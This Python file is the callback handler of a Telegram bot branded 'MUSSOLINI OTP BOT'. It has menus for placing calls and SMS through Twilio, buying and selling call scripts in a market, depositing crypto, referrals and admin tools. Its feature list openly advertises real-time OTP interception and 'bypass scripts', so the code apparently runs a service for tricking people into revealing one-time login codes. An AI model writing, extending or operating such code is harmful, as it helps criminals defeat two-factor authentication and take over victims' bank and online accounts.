import os
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from config import bot, ADMIN_IDS
from database import get_connection, add_balance, get_all_plans, get_plan_by_id, deduct_balance, save_user_script, get_all_user_scripts, get_setting
from handlers.wizard import start_call_wizard, start_sms_wizard, start_balance_wizard
from handlers.payments import create_dynamic_plan_invoice, create_script_invoice, check_payment_status
from handlers.profile import get_profile_content, show_referral
from handlers.keys import process_key_step
from handlers.admin import check_twilio_status

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    
    # Filtros
    if call.data.startswith("live_") or call.data.startswith("wiz_") and not call.data in ["wiz_call", "wiz_sms", "wiz_addbal", "wiz_genkey", "wiz_addplan", "wiz_delplan", "wiz_changelog", "wiz_maint_toggle"] and not call.data.startswith("wiz_cast_"): 
        return
    if call.data.startswith("gkey_"): return

    # ==========================================
    # 🔙 BACK HOME (Actualizado con Features/Commands)
    # ==========================================
    if call.data == "back_home":
        text = f"🛡️ <b>MUSSOLINI OTP BOT v31</b>\n━━━━━━━━━━━━━━━━━━━━\nHello, <b>{call.from_user.first_name}</b>."
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⚡ ＤＡＳＨＢＯＡＲＤ", callback_data="open_dashboard"))
        markup.row(InlineKeyboardButton("🛒 Market", callback_data="market_home"), InlineKeyboardButton("👤 Profile", callback_data="show_profile"))
        markup.row(InlineKeyboardButton("🪙 Deposit", callback_data="buy_subs"), InlineKeyboardButton("🎟️ Redeem Key", callback_data="enter_key"))
        
        # NUEVOS BOTONES
        markup.row(InlineKeyboardButton("🤖 Commands", callback_data="commands"), InlineKeyboardButton("🛠️ Features", callback_data="features"))
        
        markup.row(InlineKeyboardButton("👥 Referral", callback_data="referral"), InlineKeyboardButton("⛑️ Support", callback_data="support"))
        
        if user_id in ADMIN_IDS:
            markup.add(InlineKeyboardButton("🕴️ ＡＤＭＩＮ  ＰＡＮＥＬ", callback_data="admin_panel"))
        try: bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
        except: bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="HTML")

    # ==========================================
    # 🤖 COMMANDS LIST
    # ==========================================
    elif call.data == "commands":
        text = (
            "🤖 <b>COMMAND LIST</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "<b>User Commands:</b>\n"
            "• /start - Main Menu\n"
            "• /call [Number] [Service] - Start Call\n"
            "• /sms [Number] [Service] - Send SMS\n"
            "• /myid - Show your Telegram ID\n"
            "• /changelog - View updates\n\n"
            "<b>Admin Commands:</b>\n"
            "• /addbalance [ID] [Amount]\n"
            "• /twilio - Check API status"
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # ==========================================
    # 🛠️ FEATURES LIST
    # ==========================================
    elif call.data == "features":
        text = (
            "🛠️ <b>BOT FEATURES</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "✅ <b>OTP Intercept:</b> Capture codes in real-time.\n"
            "✅ <b>PGP/DTMF:</b> High quality bypass scripts.\n"
            "✅ <b>Script Market:</b> Buy/Sell custom scripts.\n"
            "✅ <b>Referral System:</b> Earn money inviting users.\n"
            "✅ <b>Crypto Payments:</b> Automatic deposits.\n"
            "✅ <b>Twilio Integration:</b> Stable calling routes."
        )
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # ... (MANTÉN TODO EL RESTO DEL ARCHIVO IGUAL: DASHBOARD, ADMIN, DEPOSIT, ETC.) ...
    # COPIA Y PEGA EL RESTO DE TU CALLBACKS.PY AQUÍ ABAJO
    # (Dashboard, Admin Panel, Payments, Market, etc.)
    
    # --- DASHBOARD ---
    elif call.data == "open_dashboard":
        text = "⚡ <b>ＤＡＳＨＢＯＡＲＤ</b>\n━━━━━━━━━━━━━━━━━━━━\nSelect tool:"
        markup = InlineKeyboardMarkup()
        markup.row(InlineKeyboardButton("📞 Call", callback_data="wiz_call"), InlineKeyboardButton("📩 SMS", callback_data="wiz_sms"))
        markup.row(InlineKeyboardButton("📂 Scripts", callback_data="show_myscripts"), InlineKeyboardButton("💎 Shop", callback_data="show_shop"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # --- ADMIN PANEL ---
    elif call.data == "admin_panel":
        if user_id in ADMIN_IDS:
            m_status = get_setting("maintenance_mode") or "OFF"
            m_icon = "🔴" if m_status == "OFF" else "🟢"
            text = f"🕴️ <b>ＡＤＭＩＮ</b>\n━━━━━━━━━━━━━━━━━━━━\n🛠 <b>Maint Mode:</b> {m_status}\nSelect tool:"
            markup = InlineKeyboardMarkup()
            markup.row(InlineKeyboardButton("💰 Add Bal", callback_data="wiz_addbal"), InlineKeyboardButton("🎟️ Gen Key", callback_data="wiz_genkey"))
            markup.row(InlineKeyboardButton("➕ Add Plan", callback_data="wiz_addplan"), InlineKeyboardButton("➖ Del Plan", callback_data="wiz_delplan"))
            markup.row(InlineKeyboardButton("📝 Changelog", callback_data="wiz_changelog"), InlineKeyboardButton(f"{m_icon} Maint Mode", callback_data="wiz_maint_toggle"))
            markup.add(InlineKeyboardButton("📢 Broadcast Menu", callback_data="adm_cast_menu"))
            markup.row(InlineKeyboardButton("📡 Twilio", callback_data="adm_twilio"), InlineKeyboardButton("📜 Logs", callback_data="show_log"))
            markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
            bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # --- BROADCAST ---
    elif call.data == "adm_cast_menu":
        text = "📢 <b>BROADCAST MENU</b>\nSelect message type:"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📢 General Announce", callback_data="wiz_cast_general"))
        markup.add(InlineKeyboardButton("🔄 New Update", callback_data="wiz_cast_update"))
        markup.add(InlineKeyboardButton("⚠️ Maintenance Warning", callback_data="wiz_cast_maint"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # --- TWILIO & LOGS ---
    elif call.data == "adm_twilio":
        bot.answer_callback_query(call.id, "⏳ Connecting...")
        success, bal, stat, nums = check_twilio_status()
        msg = f"📡 <b>TWILIO</b>\n💰 {bal}\n📊 {stat}\n{nums}" if success else f"❌ Error: {bal}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "show_log":
        try:
            with open("bot.log", "r") as f: lines = f.readlines()[-20:]
            log_text = "".join(lines)
        except: log_text = "No logs."
        if len(log_text) > 3000: log_text = log_text[-3000:]
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="admin_panel"))
        bot.edit_message_text(f"📜 <b>LOGS:</b>\n<pre>{log_text}</pre>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # --- DEPOSIT (PAYMENTS) ---
    elif call.data == "buy_subs":
        plans = get_all_plans()
        text = "🪙 <b>DEPOSIT</b>\nChoose plan:" if plans else "No plans."
        markup = InlineKeyboardMarkup()
        for p in plans: markup.add(InlineKeyboardButton(f"💵 ${p[1]} (Get ${p[2]})", callback_data=f"plan_buy_{p[0]}"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data.startswith("plan_buy_"):
        plan_id = int(call.data.split("_")[2])
        create_dynamic_plan_invoice(user_id, plan_id)
        bot.delete_message(call.message.chat.id, call.message.message_id)

    elif call.data.startswith("chk_plan_"):
        parts = call.data.split("_")
        pay_id, plan_id = parts[2], int(parts[3])
        if check_payment_status(pay_id):
            plan = get_plan_by_id(plan_id)
            if plan:
                reward = float(plan[1])
                add_balance(user_id, reward)
                bot.edit_message_text(f"✅ <b>SUCCESS!</b>\nAdded ${reward}", call.message.chat.id, call.message.message_id, parse_mode="HTML")
        else: bot.answer_callback_query(call.id, "⏳ Waiting...", show_alert=True)

    # --- MARKET ---
    elif call.data == "market_home":
        text = "🛒 <b>MARKET</b>"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("📂 My Scripts", callback_data="show_myscripts"), InlineKeyboardButton("📚 Free Lib", callback_data="show_freescripts"), InlineKeyboardButton("💎 Shop", callback_data="show_shop"))
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="back_home"))
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "show_myscripts":
        scripts = get_all_user_scripts(user_id)
        msg = "📂 <b>MY SCRIPTS</b>\n" + ("\n".join([f"🔹 {s[0]}" for s in scripts]) if scripts else "Empty.")
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="market_home"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    elif call.data == "show_shop":
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT id, title, price FROM otp_market WHERE is_premium = TRUE")
        items = cur.fetchall()
        conn.close()
        msg = "💎 <b>SHOP</b>\n" + ("\n".join([f"🔹 {i[1]} (${i[2]}) - ID: {i[0]}" for i in items]) if items else "Empty.")
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="market_home"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
        
    elif call.data == "show_freescripts":
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT service_name FROM otp_market WHERE price = 0 OR is_premium = FALSE")
        items = cur.fetchall()
        conn.close()
        msg = "📚 <b>LIBRARY</b>\n" + ("\n".join([f"🔹 {i[0]}" for i in items]) if items else "Empty.")
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅ Back", callback_data="market_home"))
        bot.edit_message_text(msg, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")

    # --- OTHER FEATURES ---
    elif call.data == "show_profile":
        text, markup = get_profile_content(user_id, call.from_user.first_name)
        if text: bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML")
    
    elif call.data == "enter_key":
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancel", callback_data="back_home"))
        msg = bot.send_message(call.message.chat.id, "🎟️ <b>Send Key:</b>", reply_markup=markup, parse_mode="HTML")
        bot.register_next_step_handler(msg, process_key_step)

    elif call.data == "referral":
        show_referral(call.message)
    
    elif call.data == "support":
        text = "⛑️ **SUPPORT**\n━━━━━━━━━━━━━━━━\nContact Admin: @Mussolini860\n━━━━━━━━━━━━━━━━\nContact Developer for Issues\n🦠 @whois_tyler (VirusNTO)"
        bot.answer_callback_query(call.id, "Support contact sent.")
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")

    # --- WIZARD TRIGGERS ---
    elif call.data == "wiz_call":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_call_wizard(call.message)
    elif call.data == "wiz_sms":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_sms_wizard(call.message)
    elif call.data == "wiz_addbal":
        if user_id in ADMIN_IDS:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_balance_wizard(call.message)
    
    # --- BUY SCRIPT HANDLERS ---
    elif call.data.startswith("buy_cred_"):
        sid = int(call.data.split("_")[2])
        # process_purchase se importa de callbacks pero aqui está definida abajo
        process_purchase(call.message, user_id, sid, "credits")

    elif call.data.startswith("buy_cryp_"):
        sid = int(call.data.split("_")[2])
        conn = get_connection()
        cur = conn.cursor()
        cur.execute("SELECT title, price FROM otp_market WHERE id=%s", (sid,))
        res = cur.fetchone()
        conn.close()
        if res: create_script_invoice(user_id, sid, res[1], res[0])

    elif call.data.startswith("chk_scr_"):
        parts = call.data.split("_")
        pay_id, sid = parts[2], int(parts[3])
        if check_payment_status(pay_id): process_purchase(call.message, user_id, sid, "crypto")
        else: bot.answer_callback_query(call.id, "⏳ Waiting for payment...", show_alert=True)

def process_purchase(message, buyer_id, script_id, method):
    conn = get_connection()
    cur = conn.cursor()
    cur.execute("SELECT service_name, language, script_text, title, price, author_id, payout_pref FROM otp_market WHERE id = %s", (script_id,))
    data = cur.fetchone()
    if data:
        service, lang, text, title, price, author, pref = data
        price = float(price)
        if method == "credits":
            if not deduct_balance(buyer_id, price):
                conn.close()
                return bot.send_message(buyer_id, "💸 Insufficient Credits.")
        cur.execute("INSERT INTO otp_purchases (user_id, script_id) VALUES (%s, %s)", (buyer_id, script_id))
        save_user_script(buyer_id, service, lang, text)
        comm = price * 0.60
        if pref == "credits": add_balance(author, comm)
        conn.commit()
        bot.send_message(buyer_id, f"✅ Bought <b>{title}</b>", parse_mode="HTML")
    conn.close()
